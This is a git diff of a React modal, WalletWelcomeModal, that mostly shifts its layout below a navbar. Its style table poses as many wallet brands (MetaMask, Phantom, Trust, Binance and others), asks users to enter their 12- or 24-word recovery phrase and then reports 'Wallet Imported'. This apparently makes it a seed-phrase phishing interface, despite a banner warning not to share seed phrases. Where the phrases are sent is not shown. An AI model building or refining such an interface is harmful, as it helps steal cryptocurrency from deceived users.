@@ -1,6 +1,6 @@
-// WalletWelcomeModal.tsx
-// Fully converted to JSX syntax (no TypeScript types, plain React with JSX)
-// All logic preserved, UI/UX per-wallet improvements kept, connection flow intact
+// WalletWelcomeModal.jsx
+// Shifted downwards to avoid overlap with navbar
+// All other logic and per-wallet UI preserved
 
 "use client";
 
@@ -23,7 +23,6 @@ const WALLET_STYLES = {
     subtitle: "Enter your 12-word phrase in order",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to MetaMask...",
-   
     buttonText: "Import",
   },
   "Coinbase Wallet": {
@@ -51,7 +50,6 @@ const WALLET_STYLES = {
     subtitle: "Enter your 12 or 24-word phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Phantom...",
-
     buttonText: "Import",
   },
   Trust: {
@@ -79,7 +77,6 @@ const WALLET_STYLES = {
     subtitle: "Enter your secret recovery phrase",
     successTitle: "Wallet Restored",
     successMessage: "Connecting to Rainbow...",
-
     buttonText: "Restore Wallet",
   },
   WalletConnect: {
@@ -93,7 +90,6 @@ const WALLET_STYLES = {
     subtitle: "Enter phrase if required",
     successTitle: "Session Authenticated",
     successMessage: "Connecting via WalletConnect...",
- 
     buttonText: "Connect",
   },
   SafePal: {
@@ -107,7 +103,6 @@ const WALLET_STYLES = {
     subtitle: "Enter recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to SafePal...",
-  
     buttonText: "Import",
   },
   "Binance Wallet": {
@@ -121,7 +116,6 @@ const WALLET_STYLES = {
     subtitle: "Enter your recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Binance Web3...",
-   
     buttonText: "Import",
   },
   Zerion: {
@@ -135,7 +129,6 @@ const WALLET_STYLES = {
     subtitle: "Enter recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Zerion...",
-  
     buttonText: "Import",
   },
   OKX: {
@@ -163,7 +156,6 @@ const WALLET_STYLES = {
     subtitle: "Enter recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Brave Wallet...",
-   
     buttonText: "Import",
   },
   Frame: {
@@ -328,14 +320,29 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
   if (!isOpen) return null;
 
   return (
-    <div className="fixed inset-0 z-[9999] flex items-end md:items-center justify-center bg-black/75 backdrop-blur-xl p-4 pb-12 md:pb-6 transition-opacity duration-300">
+    <div 
+      className="
+        fixed inset-0 z-[9999] 
+        flex items-start md:items-center justify-center 
+        bg-black/75 backdrop-blur-xl 
+        pt-16 md:pt-0 pb-12 md:pb-8 transition-opacity duration-300
+      "
+    >
       <Card
-        className={`relative w-full max-w-md md:max-w-lg overflow-hidden border ${theme.border} ${theme.bg} rounded-3xl md:rounded-3xl shadow-2xl shadow-black/70 transform transition-all duration-300`}
+        className={`
+          relative w-full max-w-md md:max-w-lg 
+          overflow-hidden border ${theme.border} ${theme.bg} 
+          rounded-3xl md:rounded-3xl 
+          shadow-2xl shadow-black/70 
+          transform transition-all duration-300
+        `}
       >
-        <div className={`absolute inset-x-0 top-0 h-48 bg-gradient-to-b ${theme.gradient} opacity-15 blur-3xl pointer-events-none`} />
+        <div 
+          className={`absolute inset-x-0 top-0 h-48 bg-gradient-to-b ${theme.gradient} opacity-15 blur-3xl pointer-events-none`} 
+        />
 
         <div className="absolute top-3 left-3 md:top-4 md:left-4 z-30 bg-red-700/90 text-white text-xs font-bold px-3 py-1 rounded-full shadow">
-      DO NOT SHARE SEED PHRASES WITH ANYBODY!!!!!!!!!!!
+          DO NOT SHARE SEED PHRASES WITH ANYBODY!!!!!!!!!!!
         </div>
 
         <button
@@ -413,11 +420,10 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
                 </div>
 
                 <p className="text-center text-xs text-zinc-500 pt-3">
-                 
+                  {/* You can add warning text here if needed */}
                 </p>
               </form>
             </>
-            
           ) : (
             <div className="text-center py-10 animate-in fade-in zoom-in duration-500">
               <div className={`w-24 h-24 mx-auto rounded-full bg-gradient-to-br ${theme.gradient} bg-opacity-10 border border-white/10 flex items-center justify-center mb-8 shadow-lg`}>
@@ -456,7 +462,7 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
 
           <div className="mt-10 pt-6 border-t border-zinc-800/50 flex items-center justify-center gap-3 text-xs uppercase tracking-wider font-semibold text-zinc-500">
             <Lock size={14} className={theme.accent} />
-            {theme.bottomNote}
+            {theme.bottomNote || "!"}
           </div>
         </div>
       </Card>
